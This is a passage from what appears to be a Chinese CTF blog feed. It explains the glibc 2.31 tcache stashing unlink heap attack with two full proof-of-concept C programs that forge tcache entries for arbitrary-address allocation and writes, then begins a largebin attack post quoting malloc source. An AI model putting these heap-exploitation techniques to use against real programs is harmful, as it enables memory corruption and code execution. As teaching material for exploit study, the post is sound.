class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack+"></a>tcache stashing unlink attack+</h2><p>根据上面的进一步分析我们继续来heap exploit里面的poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> victim[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *t1;</span><br><span class="line"><span class="keyword">char</span> *s1, *s2, *pad;</span><br><span class="line"><span class="keyword">char</span> *tmp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You can use this technique to get a tcache chunk to arbitrary address\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n1. need to know heap address and the victim address that you need to attack\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">tmp = <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s address: %p, victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, </span><br><span class="line">&amp;victim, victim[<span class="number">0</span>], victim[<span class="number">1</span>], victim[<span class="number">2</span>], victim[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;heap address: %p\n&quot;</span>, tmp<span class="number">-0x260</span>);</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n2. change victim&#x27;s data, make victim[1] = &amp;victim, or other address to writable address\n&quot;</span>);</span><br><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">uint64_t</span>)(&amp;victim);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n3. choose a stable size and free five identical size chunks to tcache_entry list\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Here, I choose the size 0x60\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">t1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line"><span class="built_in">free</span>(t1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, </span><br><span class="line">t1, t1<span class="number">-0x60</span>, t1<span class="number">-0x60</span>*<span class="number">2</span>, t1<span class="number">-0x60</span>*<span class="number">3</span>, t1<span class="number">-0x60</span>*<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">s1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;</span>, s1);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;</span>, s1);</span><br><span class="line"><span class="built_in">free</span>(s1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Free chunk %p to unsortedbin\n&quot;</span>, s1);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;</span>);</span><br><span class="line">s2 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">free</span>(s2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s2+<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;</span>, s2+<span class="number">0x3c0</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n5. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\n&quot;</span>, s2+<span class="number">0x3c0</span>, (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>);</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)((s2+<span class="number">0x3c0</span>)+<span class="number">0x18</span>) = (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, </span><br><span class="line">&amp;victim, s2+<span class="number">0x3d0</span>, t1, t1<span class="number">-0x60</span>, t1<span class="number">-0x60</span>*<span class="number">2</span>, t1<span class="number">-0x60</span>*<span class="number">3</span>, t1<span class="number">-0x60</span>*<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Apply to tcache_entry[4], you can get a pointer to victim address\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *r = (<span class="keyword">uint64_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">r[<span class="number">0</span>] = <span class="number">0xaa</span>;</span><br><span class="line">r[<span class="number">1</span>] = <span class="number">0xbb</span>;</span><br><span class="line">r[<span class="number">2</span>] = <span class="number">0xcc</span>;</span><br><span class="line">r[<span class="number">3</span>] = <span class="number">0xdd</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, </span><br><span class="line">victim[<span class="number">0</span>], victim[<span class="number">1</span>], victim[<span class="number">2</span>], victim[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，这里直放入了五个chunk到tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">    t1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">free</span>(t1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后后面是类似的放入两个chunk到smallbin，然后改变bk指针到我们的fake chunk，最后calloc我们的s1即可实现</p><p><strong>需要注意的是，这里<code>victim[1] = (uint64_t)(&amp;victim);</code>是需要将fake_chunk的bk指针指向任意可写地址！</strong></p><p><img src="/images/image-20220224171340793.png" alt="image-20220224171340793"></p><p>这个时候我们的利用危害性相对来说就比较大了，但是我们可以结合起来第一个漏洞来一起使用，也就是同时修改指定地址的值，并且在另一个地方创建fake chunk</p><h2 id="tcache-stashing-unlink-attack-1"><a href="#tcache-stashing-unlink-attack-1" class="headerlink" title="tcache stashing unlink attack++"></a>tcache stashing unlink attack++</h2><p>其实利用方式也很简单，就是我们修改fake chunk的bk指针就行，这里就不细说，把poc贴出来就行了(要恰饭了)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> victim[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> victim2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *t1;</span><br><span class="line"><span class="keyword">char</span> *s1, *s2, *pad;</span><br><span class="line"><span class="keyword">char</span> *tmp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You can use this technique to get a tcache chunk to arbitrary address, at the same time, write a big number to arbitrary address\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n1. need to know heap address, the victim address that you need to get chunk pointer and the victim address that you need to write a big number\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">tmp = <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s address: %p, victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, </span><br><span class="line">&amp;victim, victim[<span class="number">0</span>], victim[<span class="number">1</span>], victim[<span class="number">2</span>], victim[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;victim2&#x27;s address: %p, victim2&#x27;s value: 0x%lx\n&quot;</span>,</span><br><span class="line">&amp;victim2, victim2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;heap address: %p\n&quot;</span>, tmp<span class="number">-0x260</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n2. change victim&#x27;s data, make victim[1] = &amp;victim2-0x10\n&quot;</span>);</span><br><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">uint64_t</span>)(&amp;victim2)<span class="number">-0x10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, </span><br><span class="line">victim[<span class="number">0</span>], victim[<span class="number">1</span>], victim[<span class="number">2</span>], victim[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n3. choose a stable size and free five identical size chunks to tcache_entry list\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Here, I choose the size 0x60\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">t1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line"><span class="built_in">free</span>(t1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, </span><br><span class="line">t1, t1<span class="number">-0x60</span>, t1<span class="number">-0x60</span>*<span class="number">2</span>, t1<span class="number">-0x60</span>*<span class="number">3</span>, t1<span class="number">-0x60</span>*<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">s1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;</span>, s1);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;</span>, s1);</span><br><span class="line"><span class="built_in">free</span>(s1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Free chunk %p to unsortedbin\n&quot;</span>, s1);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;</span>);</span><br><span class="line">s2 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">free</span>(s2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s2+<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;</span>, s2+<span class="number">0x3c0</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n5. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\n&quot;</span>, s2+<span class="number">0x3c0</span>, (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>);</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)((s2+<span class="number">0x3c0</span>)+<span class="number">0x18</span>) = (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, </span><br><span class="line">&amp;victim, s2+<span class="number">0x3d0</span>, t1, t1<span class="number">-0x60</span>, t1<span class="number">-0x60</span>*<span class="number">2</span>, t1<span class="number">-0x60</span>*<span class="number">3</span>, t1<span class="number">-0x60</span>*<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Apply to tcache_entry[4], you can get a pointer to victim address\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *r = (<span class="keyword">uint64_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">r[<span class="number">0</span>] = <span class="number">0xaa</span>;</span><br><span class="line">r[<span class="number">1</span>] = <span class="number">0xbb</span>;</span><br><span class="line">r[<span class="number">2</span>] = <span class="number">0xcc</span>;</span><br><span class="line">r[<span class="number">3</span>] = <span class="number">0xdd</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, </span><br><span class="line">victim[<span class="number">0</span>], victim[<span class="number">1</span>], victim[<span class="number">2</span>], victim[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;victim2&#x27;s value: 0x%lx\n&quot;</span>,</span><br><span class="line">victim2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://github.com/StarCross-Tech/heap_exploit_2.31" >https://github.com/StarCross-Tech/heap_exploit_2.31<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;tcache stashing unlink attack作为house of pig的基础，所在这一篇更新完了就会跟新house of pig以及SROP。&lt;/p&gt;
&lt;p&gt;首先，这种利用方式需要的条件就是存在calloc来申请chunk。&lt;/p&gt;
&lt;h2 id=&quot;在Gli</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="tcache stashing unlink attack" scheme="https://cv196082.gitee.io/tags/tcache-stashing-unlink-attack/"/>
    
  </entry>
  
  <entry>
    <title>largebin attack</title>
    <link href="https://cv196082.gitee.io/2022/02/23/largebin-attack/"/>
    <id>https://cv196082.gitee.io/2022/02/23/largebin-attack/</id>
    <published>2022-02-23T05:35:47.000Z</published>
    <updated>2022-02-23T08:26:22.572Z</updated>
    
    <content type="html"><![CDATA[<p>关于largebin的原理这里就只给一张图吧，也是在网上找的(我懒得画)。</p><p><img src="/images/20190516131203-242dd8f2-7799-1.png" alt="20190516131203-242dd8f2-7799-1"></p><p>largebin一直是容易被忽略的利用方式(可能只是我这样吧)，在此之前我一直觉得largebin不会出现直到最近的比赛怎么全是这玩意，所以又下来学习了一遍。</p><h2 id="Glibc2-23到Glibc2-27下的largebin-attack"><a href="#Glibc2-23到Glibc2-27下的largebin-attack" class="headerlink" title="Glibc2.23到Glibc2.27下的largebin attack"></a>Glibc2.23到Glibc2.27下的largebin attack</h2><p>其实Glibc2.27和Glibc2.23的利用方式都差不多，只不过在2.27里增加了tcache机制，所以想实现largebin attack要么占满tcache，或则大于tcache范围。</p><p>下面源码是当unsorted bin 当作的chunk进入large bin的过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">victim_index = largebin_index (size);</span><br><span class="line">bck = bin_at (av, victim_index); </span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line"><span class="keyword">if</span> (fwd != bck)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">    size |= PREV_INUSE;</span><br><span class="line">    <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">    assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)               </span><br><span class="line">        &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">    &#123;</span><br><span class="line">        fwd = bck;</span><br><span class="line">        bck = bck-&gt;bk;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; </span><br><span class="line">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        assert (chunk_main_arena (fwd));</span><br><span class="line">        <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd)) </span><br><span class="line">        &#123;</span><br><span class="line">            fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">            assert (chunk_main_arena (fwd));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">            == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">            <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">            fwd = fwd-&gt;fd; </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            victim-&gt;fd_nextsize = fwd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;bk_nextsize = victim;</span><br><span class="line">            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        bck = fwd-&gt;bk;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = 